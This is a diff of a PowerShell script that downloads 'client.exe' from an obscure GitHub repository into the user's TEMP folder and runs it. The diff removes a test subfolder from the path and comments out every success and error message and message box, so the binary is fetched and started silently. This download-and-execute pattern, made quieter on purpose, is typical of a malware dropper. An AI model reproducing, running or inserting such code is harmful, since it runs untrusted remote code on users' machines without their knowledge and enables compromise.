@@ -7,20 +7,20 @@ try {
 
     # Download the client.exe file
     $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
-    $exePath = "$env:TEMP\test\client.exe"
+    $exePath = "$env:TEMP\client.exe"
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
     # Run the downloaded client.exe
     Start-Process $exePath -ErrorAction Stop
-    Write-Host "client.exe launched successfully."
+    # Write-Host "client.exe launched successfully."
 
     # Show success message box
-    Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show("Script executed successfully!", "Success", "OK", "Information")
+    # Add-Type -AssemblyName PresentationFramework
+    # [System.Windows.MessageBox]::Show("Script executed successfully!", "Success", "OK", "Information")
 } catch {
-    Write-Host "An error occurred: $_"
+    # Write-Host "An error occurred: $_"
 
     # Show error message box
-    Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show("An error occurred: $_", "Error", "OK", "Error")
+    # Add-Type -AssemblyName PresentationFramework
+    # [System.Windows.MessageBox]::Show("An error occurred: $_", "Error", "OK", "Error")
 }
